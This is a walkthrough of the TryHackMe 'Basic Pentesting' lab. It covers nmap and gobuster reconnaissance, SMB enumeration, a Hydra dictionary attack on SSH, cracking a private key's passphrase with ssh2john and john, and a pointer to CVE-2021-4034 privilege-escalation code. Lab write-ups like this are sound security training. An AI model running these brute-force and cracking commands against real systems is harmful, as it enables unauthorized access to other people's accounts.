## Basic Pentesting

### Recon with Nmap

Let us start with a simple nmap scan to check what services the target machine is hosting.

````
export ip=<TARGET IP>
nmap -A -p- $ip -oN basicpentest.nmap
````

> Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 17:52 EST
> Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
> Service scan Timing: About 83.33% done; ETC: 17:53 (0:00:02 remaining)
> Nmap scan report for 10.10.26.168
> Host is up (0.045s latency).
> Not shown: 65529 closed tcp ports (conn-refused)
> PORT     STATE SERVICE     VERSION
> **22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)**
> | ssh-hostkey: 
> |   2048 db45cbbe4a8b71f8e93142aefff845e4 (RSA)
> |   256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ECDSA)
> |_  256 a5682b225f984a62213da2e2c5a9f7c2 (ED25519)
> **80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))**
> |_http-server-header: Apache/2.4.18 (Ubuntu)
> |_http-title: Site doesn't have a title (text/html).
> **139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)**
> **445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)**
> **8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)**
> | ajp-methods: 
> |_  Supported methods: GET HEAD POST OPTIONS
> **8080/tcp open  http        Apache Tomcat 9.0.7**
> |_http-favicon: Apache Tomcat
> |_http-title: Apache Tomcat/9.0.7
> Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
>
> Host script results:
> |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
> | smb2-security-mode: 
> |   311: 
> |_    Message signing enabled but not required
> | smb-security-mode: 
> |   account_used: guest
> |   authentication_level: user
> |   challenge_response: supported
> |_  message_signing: disabled (dangerous, but default)
> | smb2-time: 
> |   date: 2023-01-22T22:53:21
> |_  start_date: N/A
> |_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
> | smb-os-discovery: 
> |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
> |   Computer name: basic2
> |   NetBIOS computer name: BASIC2\x00
> |   Domain name: \x00
> |   FQDN: basic2
> |_  System time: 2023-01-22T17:53:21-05:00
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 30.56 seconds

The target machine is running Ubuntu and hosts a web server and SMB with Samba.

### Web Enumeration with GoBuster

If we open the website on port 80 we can see that it is under maintenance. Where should we go from here?

The THM room hints us about a hidden web server directory. We can use Gobuster to find this directory with the following command:

```
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Great! We were able to find the */development* directory!

**Question**: What is the name of the hidden directory on the web server(enter name without /)?

> development

Exploring this directory uncovers two text files: dev.txt and and j.txt.

dev.txt hints us that the server is running Apache and SMB.

j.txt hints us that user "J" has a weak password!

We still don't know who user J is. Maybe we can find this out through enumerating SMB.

### SMB

In order to enumerate SMB we can use enum4linux with the -a flag such as below

```
enum4linux -a 10.10.26.168
```

> +] Attempting to map shares on 10.10.26.168                                                                                                                                                                                                                                                                                                                                                                                       //10.10.26.168/Anonymous        Mapping: OK Listing: OK Writing: N/A
>
> [+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                                                                                                                                                                                                  S-1-22-1-1000 Unix User\kay (Local User)                                                                                                                                                                           S-1-22-1-1001 Unix User\jan (Local User)

Great! We found the Anonymous share and the users kay and jan!

If we login into the Anonymous share not there is a file inside but it does not provide us with any relevant information.

```
smbclient //10.10.26.168/Anonymous -N
ls
get staff.txt
exit
cat staff.txt
```

> Announcement to staff:
>
> PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
> this is how mistakes happen. (This means you too, Jan!)
>
> -Kay

Nonetheless, now that we know both usernames we could try bruteforcing our way into jan's weak password using Hydra on the SSH service.

Additionally, we can answer another new question.

**Question** What is the username?

> Jan

### Brute Forcing SSH with Hydra (jan)

Now we just have to configure Hydra to perform a dictionary attack on SSH with user Jan.

```
hydra -t 16 -l jan -P /usr/share/wordlists/rockyou.txt -vV $ip ssh
```

> 22][ssh] host: 10.10.26.168   login: jan   password: <Redacted>

Great job! Now we can login through SSH on the target!

```
ssh jan@$ip
```

**Question** What is the password?

> <Redacted>

**Question** What service do you use to access the server(answer in abbreviation in all caps)?

> SSH

After getting a shell we have two ways to moving forward to escalate our privileges. Identify privilege escalation vectors with LinPeas.sh or enumerate manually.

### SSH Key Authentication (kay)

Either way you should end up finding the /home/kay/.ssh folder. 

**Question** What is the name of the other user you found(all lower case)?

> kay

Inside this folder we have the passphrase protected private key (id_rsa) and public key. Let us try to copy the private key and crack its passphrase to login with Kay's account using SSH.

After copying the private key to our local machine we can use **ssh2john** to extract the passphrase hash from the private key file and attemp to crack it using john and the rockyou.txt file.

```
ssh2john <private key> > <hash output file>
john --wordlist=/usr/share/wordlists/rockyou.txt <hash output file>
```

> <Redacted>          (id_rsa)

Great! Now all we have to do is login using the private key and input the cracked passphrase.

```
ssh -i <private key> kay@$ip
```

If you had not already seen it there is a pass.bak file in kay's home dir which contains kay's password, thus answering the final question of the room.

**Question** What is the final password you obtain?

> <Redacted>

### Bonus: Escalate

After running LinPeas we can see that the machine is vulnerable to:

> CVEs Check
> Vulnerable to CVE-2021-4034

This is a Privilege Escalation vector to take advantage of with [code available online](https://github.com/berdav/CVE-2021-4034) to exploit this vulnerability.
